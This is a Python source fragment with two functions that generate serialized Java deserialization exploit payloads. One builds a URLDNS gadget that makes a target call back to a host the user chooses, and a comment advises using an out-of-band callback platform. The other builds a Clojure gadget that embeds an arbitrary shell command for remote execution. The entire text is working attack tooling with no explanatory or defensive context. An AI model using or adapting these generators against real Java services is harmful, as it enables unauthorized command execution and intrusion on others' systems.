def gen_URLDNS(hostport):
    '''
       写poc的话，用反连平台
    '''
    if hostport.startswith("https://") or hostport.startswith("http://"):
        raise ValueError("URLDNS'arg need format domain:port,not startwith https:// or http://")

    if ":" not in hostport:
        raise ValueError("URLDNS'arg  need format like: domain:port")
    else:
        host, port = hostport.split(":", 1)
        if not port.isdigit():
            raise ValueError("port must be digit")
        port = int(port)
        payload = ""
        payload += binascii.b2a_hex(struct.pack('>H', port)).decode()  # hex port
        payload += "74"
        payload += binascii.b2a_hex(struct.pack('>H', len(hostport))).decode()  # hex len(host: port)
        payload += binascii.b2a_hex(hostport.encode()).decode()  # hex host port
        payload += "74000074"
        payload += binascii.b2a_hex(struct.pack('>H', len(host))).decode()  # hex len(host)
        payload += binascii.b2a_hex(host.encode()).decode()  # hex host
        payload += "740004"
        payload += "68747470"  # hex http
        payload += "707874"
        payload += binascii.b2a_hex(struct.pack('>H', len("http://" + hostport))).decode()  # hex len(url)
        payload += binascii.b2a_hex(("http://" + hostport).encode()).decode()  # hex url
        payload += "78"
        return bytes(bytearray.fromhex(payload))


def gen_Clojure(cmd):
    payload = ""
    s = r'''(use '[clojure.java.shell :only [sh]]) (sh {})'''
    cmd_ = s.format(" ".join(['"{}"'.format(x) for x in cmd.split(" ")]))
    payload += binascii.b2a_hex(struct.pack('>H', len(cmd_))).decode()
    payload += binascii.b2a_hex(cmd_.encode()).decode()
    payload += "7078"
    return bytes(bytearray.fromhex(payload))


